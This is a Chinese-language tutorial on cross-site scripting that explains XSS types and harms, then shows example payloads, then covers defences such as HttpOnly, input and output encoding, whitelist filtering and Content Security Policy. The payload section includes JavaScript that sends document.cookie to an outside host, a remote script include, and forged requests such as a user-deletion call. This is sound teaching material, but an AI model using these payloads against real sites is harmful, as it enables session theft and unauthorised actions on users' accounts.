# XSS

**跨站脚本攻击(Cross Site Script)**: 因为与CSS(Cascading Style Sheet)有所区别，所以在安全领域叫作"XSS"。

> XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，XSS这个名字却一直保留下来。

## 有何危害

- 挂马。
- 盗取用户Cookie。
- DoS（拒绝服务）客户端浏览器。
- 钓鱼攻击，高级钓鱼技巧。
- 编写针对性的XSS病毒，删除目标文章、恶意篡改数据、嫁祸、“借刀杀人”。
- 劫持用户Web行为，甚至进一步渗透内网。
- 爆发Web2.0蠕虫。
- 蠕虫式的DDoS攻击。
- 蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据……

## 一个简单的例子

### 示例一

```php
// http://www.kezaihui.com/test.php
<?php
    input = $_GET["param"];
    echo "<div>".$input."</div>"
>
```
请求该URL

`http://www.kezaihui.com/test.php?param=<script>alert(/xss/)</script>`

页面中会弹出alert。

源代码是`<div><script>alert(/xxx/)</script></div>`

[示例](../demo/xss)

### [示例二](https://hilongjw.github.io/xss-demo/#/)

## XSS 的类型

- 反射型XSS：把用户输入的数据直接反射给浏览器。一般情况下，需要诱导用户触发一个链接。
- 存储型XSS：把用户输入的数据，存储在服务器中，每次用户访问该页面，都会执行这个脚本。比如，58同城发贴，填表单时，存入脚本文件，每个用户这个帖子时，就会执行这段代码。
- DOM Based XSS：通过修改页面的DOM节点形成XSS。[demo](../demo/DOM-Based-XSS-a/index.html)

## XSS Payload

> XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSSPayload”。

### 读取用户的Cookie

首先通过用户触发，加载一个远程的脚本文件

`http://www.kezaihui.com/test.php?param=<script src=http://www.xxx.com/xss.js>`

```JavaScript
var img = new Image()
img.src = 'http://www.xxx.com/log?cookie=' + encodeURIComponent(document.cookie)
img.style = 'display: block;height: 0; width: 0;'
document.body.appendChild(img)
```

**解决办法**:
- Cookie的HttpOnly属性，指示浏览器不要在除HTTP（和 HTTPS)请求之外暴露Cookie。一个有HttpOnly属性的Cookie，不能通过非HTTP方式来访问，例如通过调用JavaScript(例如，引用 document.cookie），因此，不可能通过跨域脚本（一种非常普通的攻击技术）来偷走这种Cookie。

- 将Cookie与IP进行绑定。

### 构造GET与POST请求

比如正常删除某个用户的链接是

`http://www.zaihuiba.com/operation/accounts/?phone=15689890989&spell=avada_kedavra`

对于攻击者，只需要模拟一个GET请求，便能达到攻击的目的

```JavaScript
var img = new Image()
img.src = 'http://www.zaihuiba.com/operation/accounts/?phone=15689890989&spell=avada_kedavra'
img.style = 'display: block;height: 0; width: 0;'
document.body.appendChild(img)
```

### 构造POST请求

- 构造form表单，然后自动提交

```JavaScript
var xssForm = document.createElement('form')
xssForm.action = '/path'
xssForm.method = 'POST'
document.body.appendChild(xssForm)

var input1 = document.createElement('input')
input1.name = 'xxx'
input1.value = 'yyy'

xssForm.appendChild(input1)

xssForm.submit()

```
- 使用XHR

```JavaScript
var xhr;
if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xhr = new XMLHttpRequest();
} else {
    // code for IE6, IE5
    xhr = new ActiveXObject('Microsoft.XMLHTTP');
}

xhr.open('POST', '/path');
xhr.send('name=xxx&value=xxx');
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xmlhttp.status == 200) {
        // ..
    }
};
```

- 使用fetch

```JavaScript
fetch("/path", {
    method: "POST",
    headers: {
    },
    body: ""
}).then(function(res) {
});
```

**解决办法**: 
- 重要接口，使用验证码，当然对于验证码，攻击者也可以将验证码的图片拿到后台去进行解析，拿到验证码后再进行下一步操作。甚至在前端就可以做到验证码识别。[用js实现的简单验证码识别](https://zhuanlan.zhihu.com/p/28483558)

- 或者不用cookie鉴权，将token在闭包中私有,让外包代码拿不到token。

## XSS 钓鱼

> 场景，已经拿到了用户的身份(鉴权)，想要修改用户的密码，但是修改用户密码的接口要求我们提供用户的原密码，怎么办？

- 在当前网站，伪造一个用户登录的界面，让用户登录，获取其原密码。

**如何防御**: 当需要输入密码登录时，第一次输入一个假密码，如果假密码也验证通过，那就说明这个网站目前有问题。

扩展:[危险的 target="_blank" 与 “opener”](https://paper.seebug.org/538/)

## CSS History Hack

原理是利用style的visited属性，如果用户访问过这个网站，那链接的样式会有所不同。[隐私和visited伪类选择器](https://zhuanlan.zhihu.com/p/24122413) [demo](../demo/fishing/index.html)

## XSS Worm

用户之间发生交互行为的页面，如果存在存储型的XSS，则比较容易发起XSS Worm共计，比如聊天室，空间，贴吧，微博，用户留言、站内信等。

- [第一个 XSS 蠕虫: Samy](https://wizardforcel.gitbooks.io/xss-worms-and-viruses/5.html)

## XSS 防御

### HttpOnly

专治XSS下Cookie劫持。

`Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly`

### 输入检查

常见的Web漏洞如XSS、SQLInjection等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。

输入检查，在很多时候也被用于格式检查。例如，用户在网站注册时填写的用户名，会被要求只能为字母、数字的组合。比如“hello1234”是一个合法的用户名，而“hello#$^”就是一个非法的用户名。

输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。

在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如<、>、’、”等。如果发现存在特殊字符，则将这些字符过滤或者编码。

### 输出检查

一般情况下，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击。

### 内容白名单

常见的富文本场景中，推荐对标签内容进行白名单（标签、属性等）过滤。

比如这里是一个使用 xss 的库对 HTML 做白名单过滤的简单示例：

```JavaScript
const xss = require("xss")
const options = {
    whiteList: {
        a: ["href", "title", "target"],
        p: [],
        span: [],
        h1: []
    }
}
const myxss = new xss.FilterXSS(options);
const result = myxss.process('<script>alert("xss");</script>')
```
[demo](./demo/white-lsit)

#### Vue是怎么做的

{{}}将数据解释为纯文本，而不是HTML。

对于富文本，使用`v-html`指令

```html
<div
    v-html="rawHtml"
>
```

参考: [Template Syntax](https://vuejs.org/v2/guide/syntax.html)

### 安全的HtmlEncode

[HTML 字符实体](http://www.w3school.com.cn/html/html_entities.asp)

为了对抗XSS，在HtmlEncode中要求至少转换一下字符:

字符 | 实体|
-- | -- |
& | \&amp;
< | \&lt;
\> | \&gt;
\" | &quot;
\' | &#x27; \&apos;(不推荐)
\/ | &#x2F;

PHP 中提供了`htmlentities()`和`htlspecicalchars()`两个函数可以满安全要求。(果然是世界上最好的语言)。

Python 的开发框架Django自带的模板系统'Django Templates'，可以使用escape进行HtmlEncode。

node可以使用[escape-html](https://www.npmjs.com/package/escape-html)来进行HtmlEncode。

### Content Security Policy

内容安全性政策 (CSP) 是一个可显著降低现代浏览器中 XSS 攻击的风险和影响的防护功能。 它允许网页的作者控制可以从哪里加载和执行JavaScript（和其他资源）。XSS攻击依赖于攻击者能够在用户的网页上运行恶意脚本 - 通过 \<script\> 在 \<html\>页面标记内的某处插入内联标记，或者通过诱骗浏览器从恶意第三方域加载JavaScript。 通过在响应头中设置内容安全策略，您可以告诉浏览器永远不会执行内嵌 JavaScript，并锁定哪些域名可以为页面托管 JavaScript

#### meta

```
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' ssl.google-analytics.com;">
```

#### header

```
Content-Security-Policy: default-src 'none'; script-src 'self' ssl.google-analytics.com;
```

补充：
CSP中提供了很多强大的功能，比如

block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）

upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议

plugin-types：限制可以使用的插件格式，比如禁用 flash, java applet

sandbox：浏览器行为的限制，比如不能有弹出窗口等。

[content-security-policy](https://content-security-policy.com/)

## XSS新趋势

[ESLint的NPM账户遭黑客攻击，可能窃取用户NPM访问令牌](https://cnodejs.org/topic/5b481cafe374eeab6929d67f)


---
参考
[浅析前端安全之 XSS](https://mp.weixin.qq.com/s/c_QTdLu6vsYcIiuPRZyjyA)